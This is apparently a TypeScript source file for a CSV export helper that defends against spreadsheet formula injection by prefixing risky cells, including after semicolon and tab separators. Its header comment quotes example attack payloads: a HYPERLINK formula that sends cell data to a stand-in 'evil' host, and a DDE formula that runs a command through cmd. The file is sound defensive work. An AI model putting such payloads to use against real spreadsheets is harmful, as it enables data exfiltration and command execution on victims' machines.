/**
 * The one CSV cell writer (VIZ-606) — shared by the per-chart export and the
 * two page exporters (Coverage, Failure analysis) that each used to carry a
 * private copy.
 *
 * Quoting is RFC 4180: a field holding a comma, a double quote, CR or LF is
 * wrapped in double quotes with inner quotes doubled — byte-identical to
 * those copies — and so, since the review, is a field holding `;` or TAB (see
 * below). Anything else is written as is. Rows end in CRLF.
 *
 * What the copies did NOT do, and this does: neutralise formula injection
 * (OWASP "CSV Injection", CWE-1236). Every name in these files — a test, a
 * suite, a project — comes from an ingested CI report, so a test called
 * `=HYPERLINK("http://evil/?"&A1,"click")` is ordinary input, and a
 * spreadsheet opening the export would EVALUATE it. A cell that a
 * spreadsheet could read as a formula gets a leading `'` — the character
 * spreadsheets themselves use for "this is text" — and is then quoted as
 * usual.
 *
 * WHICH CELLS. A spreadsheet decides "formula" from the cell's first
 * character, but the first character it SEES is not always ours:
 *
 *   - Leading spaces, NBSP and invisible format characters (zero-width
 *     space, BOM, bidi marks) are trimmed by LibreOffice ("Trim spaces") and
 *     Google Sheets on import before they look; a leading TAB, CR or LF too.
 *   - Full-width and small-form signs (`＝ ＋ － ＠`, U+FF1D/FF0B/FF0D/FF20,
 *     and `﹦ ﹢ ﹣ ﹫`) are folded to `= + - @` by East Asian IMEs and input
 *     normalisation.
 * So the test is made on the text after NFKC and after stripping every
 * leading `\s`, `\p{Zs}` and `\p{Cf}` character: `= + - @` there → prefixed.
 *
 * THE `;` LOCALES (review A6/F9). Excel opens a double-clicked `.csv` by
 * splitting on the system LIST SEPARATOR, and that is `;` in de-DE, fr-FR,
 * nl-NL, es-ES, it-IT, pt-BR, pl-PL and most of continental Europe. Excel
 * (and LibreOffice) honour a double quote only when it OPENS a field — the
 * first character after a separator they recognise. Our fields are separated
 * by commas, which such a machine does not recognise, so our quotes open a
 * field there only when the field starts a line. `a,"x;=1+1"` is split into
 * `a,"x` and `=1+1"` — quotes or no quotes — and the second cell is
 * evaluated: a DDE payload such as `x;=cmd|' /C calc'!A0` runs. A cell
 * produced by a split is evaluated exactly like one we wrote (Excel applies
 * the same formula rule to quoted and unquoted content). So quoting alone is
 * NOT sufficient, and two things are done:
 *
 *   1. every field containing `;` or TAB is QUOTED as well (as `,` " CR LF
 *      already were). Where our quotes are honoured — a comma locale, and a
 *      field at the start of a line in a `;` locale — the field stays ONE
 *      cell starting with its own first character;
 *   2. every SEGMENT that a spreadsheet may start a new cell or row with —
 *      the text after each `;`, TAB, CR or LF inside the value — is tested
 *      like a cell start (after the same trimming, and after any `"`, which
 *      a split cell would see as its opening quote), and a formula start
 *      there gets the `'` right after the separator: `x;'=1+1`. That is the
 *      part that holds where our quotes are NOT honoured, and it holds
 *      whatever the machine's separator, because the `'` is the first
 *      character of the split cell. The price, paid only by names that hold
 *      a separator followed by a formula character, is a visible `'` in the
 *      middle of the name in a comma locale.
 *
 * A comma is not such a separator: in a comma locale our quotes are honoured
 * at every comma boundary, and in a `;` locale a comma separates nothing.
 * (Neutralising after commas too would put a `'` into every pytest id like
 * `test_x[1,-2]`.)
 *
 * The one deliberate exception: a value that IS a plain number. A number
 * passed as a number is never touched, and neither is a string (or segment)
 * that is exactly a decimal numeral (`-5`, `-0.25`, `1e-7`), judged on the
 * RAW text: spreadsheets read those as the number they spell, not as a
 * formula, and prefixing them would turn every negative delta in an export
 * into text that no longer sums. `-1+1`, `-A1`, `- 5`, `-5)`, ` -5` and
 * `－5` are NOT plain numerals, so they are neutralised.
 */

/** Byte-order mark: without it, Excel opens UTF-8 as the ANSI code page and every non-ASCII name turns to mojibake. */
export const CSV_BOM = '\uFEFF'

/** Row separator (RFC 4180). */
export const CSV_EOL = '\r\n'

/** A string that spreadsheets read as exactly the number it spells. */
const PLAIN_NUMBER = /^-?(?:\d+\.?\d*|\.\d+)(?:[eE][-+]?\d+)?$/

/** Characters a spreadsheet may treat as the start of a formula (OWASP), after the folding below. */
const FORMULA_START = new Set(['=', '+', '-', '@'])

/** What a spreadsheet may trim before it looks at a cell's first character. */
const LEADING_IGNORED = /^[\s\p{Zs}\p{Cf}]+/u

/** Characters after which a spreadsheet may start a new cell or row on its own (see the header). */
const SEGMENT_BREAK = /[;\t\r\n]/

/** Fields that must be quoted: RFC 4180's `" , CR LF`, plus the `;` and TAB list separators. */
const MUST_QUOTE = /[",;\t\r\n]/

/** What a cell split out of our field may also open with: our own quote characters. */
const LEADING_IGNORED_AFTER_BREAK = /^["\s\p{Zs}\p{Cf}]+/u

/**
 * Whether `segment`, as the start of a cell, would be read as a formula:
 * judged on the raw text for the plain-number exemption, and after the
 * folding and trimming a spreadsheet may do for everything else.
 */
function startsFormula(segment: string, afterBreak: boolean): boolean {
  if (PLAIN_NUMBER.test(segment)) return false
  const folded = segment.normalize('NFKC').replace(afterBreak ? LEADING_IGNORED_AFTER_BREAK : LEADING_IGNORED, '')
  return folded !== '' && FORMULA_START.has(folded[0])
}

/**
 * `value` made inert for a spreadsheet, unquoted. `null` / `undefined` → `''`.
 * The value's start, and each segment after a `;`, TAB, CR or LF, gets a `'`
 * when a spreadsheet could read it as the start of a formula.
 */
export function neutraliseCsvValue(value: unknown): string {
  if (value === null || value === undefined) return ''
  if (typeof value === 'number') return String(value)
  const text = String(value)
  let out = ''
  let rest = text
  let afterBreak = false
  for (;;) {
    const at = rest.search(SEGMENT_BREAK)
    // The segment as a spreadsheet would see it: up to the NEXT break.
    const segment = at === -1 ? rest : rest.slice(0, at)
    out += startsFormula(segment, afterBreak) ? `'${segment}` : segment
    if (at === -1) return out
    out += rest[at]
    rest = rest.slice(at + 1)
    afterBreak = true
  }
}

/** One CSV field: neutralised, then quoted when it must be. */
export function csvCell(value: unknown): string {
  const text = neutraliseCsvValue(value)
  return MUST_QUOTE.test(text) ? `"${text.replace(/"/g, '""')}"` : text
}

/** One CSV line (no terminator). */
export function csvRow(values: readonly unknown[]): string {
  return values.map(csvCell).join(',')
}

/** The file body as a Blob, with the BOM Excel needs to read UTF-8. */
export function csvBlob(text: string): Blob {
  return new Blob([CSV_BOM, text], { type: 'text/csv;charset=utf-8' })
}
